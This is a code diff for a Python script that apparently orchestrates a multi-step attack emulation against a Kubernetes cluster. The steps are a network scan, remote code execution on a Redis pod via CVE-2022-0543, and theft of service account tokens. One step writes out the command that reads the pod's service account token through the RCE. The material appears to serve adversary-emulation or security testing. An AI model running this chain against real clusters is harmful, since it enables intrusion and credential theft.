@@ -270,30 +270,17 @@ def step_10_nmap(ctx):
         return out
 
     ips = _ips() or ["10.42.0.1"]
-    # ips[0] is the foothold, the rest are the redis target(s). On a multi-node
-    # cluster they sit in different per-node pod CIDRs (worker 10.42.2.x, redis
-    # 10.42.0.x) and NO prefix we can afford spans them -- a range wide enough
-    # would have to be a /16. So only try to cover both when they share a /24;
-    # otherwise anchor on redis, because a scan that misses the target makes
-    # every later unit-5 step fail with "no target resolved", while a scan that
-    # misses the foothold costs nothing (we are already inside it).
-    tgt = ips[-1]
-    same24 = len({".".join(i.split(".")[:3]) for i in ips}) == 1
-    if same24:
-        base = ".".join(ips[0].split(".")[:3])
-        octs = [int(i.split(".")[3]) for i in ips]
-        lo, hi = min(octs), max(octs)
-        prefix, net = 25, (lo // 128) * 128
-        for pfx, size in ((27, 32), (26, 64), (25, 128)):
-            n = (lo // size) * size
-            if hi < n + size:
-                prefix, net = pfx, n
-                break
-    else:
-        base = ".".join(tgt.split(".")[:3])
-        prefix, net = 27, (int(tgt.split(".")[3]) // 32) * 32
-        print(f"      foothold and target are on different nodes; anchoring on {tgt}")
-    cidr = f"{base}.{net}/{prefix}"
+    # Anchor a /27 on the REDIS address, never on the foothold. On a multi-node
+    # cluster the two sit in different per-node pod CIDRs and no affordable
+    # prefix spans them; missing the foothold costs nothing (we are executing
+    # inside it) while missing redis loses every later unit-5 step. Measured
+    # in-pod with the TTP's exact command form against the 150s tunnelled-shell
+    # budget: /27=3s, /26=142s, /25=91s, /24=176s -- /27 is the only one with
+    # real headroom, and it is enough to discover the target.
+    redis_ip = ips[-1]
+    base = ".".join(redis_ip.split(".")[:3])
+    net = (int(redis_ip.split(".")[3]) // 32) * 32
+    cidr = f"{base}.{net}/27"
     print(f"      scanning {cidr} (foothold+target ips: {','.join(ips)})")
     return execute("nmap-host-scan", pod_id("agent-system", "agent-worker"),
                    {"CIDR": cidr, "FAST_SCAN": "true"},
@@ -315,13 +302,15 @@ def step_12_install_redis_tools(ctx):
 def step_13_redis_rce(ctx):
     """unit-5/4: focus redis again and execute the RCE."""
     return execute("exploit-redis-cve-2022-0543", redis_pod_id(),
-                   note="unit-5: RCE via Lua sandbox escape")
+                   note="unit-5: RCE via Lua sandbox escape", exec_sys=exec_system())
 
 
 def step_14_read_redis_token(ctx):
     """unit-5/5: Credential Access > Read ServiceAccount Token on the Redis pod."""
-    return execute("read-service-account-token", redis_pod_id(),
-                   note="unit-5: steal oopservability-agent token")
+    return execute("exploit-redis-cve-2022-0543", redis_pod_id(),
+                   {"CMD": "cat /var/run/secrets/kubernetes.io/serviceaccount/token"},
+                   note="unit-5: read redis SA token through the RCE",
+                   exec_sys=exec_system())
 
 
 def step_15_check_redis_token(ctx):
@@ -399,7 +388,8 @@ def step_17_extract_token(ctx):
     """unit-5 part2/3: redis pod > Extract ServiceAccount Token via CVE-2026-47701."""
     return execute("extract-serviceaccount-token-via-cve-2026-47701",
                    redis_pod_id(),
-                   note="unit-5: harvest agent-orchestrator token from redis key")
+                   note="unit-5: harvest agent-orchestrator token from redis key",
+                   exec_sys=exec_system())
 
 
 def step_18_check_captured(ctx):
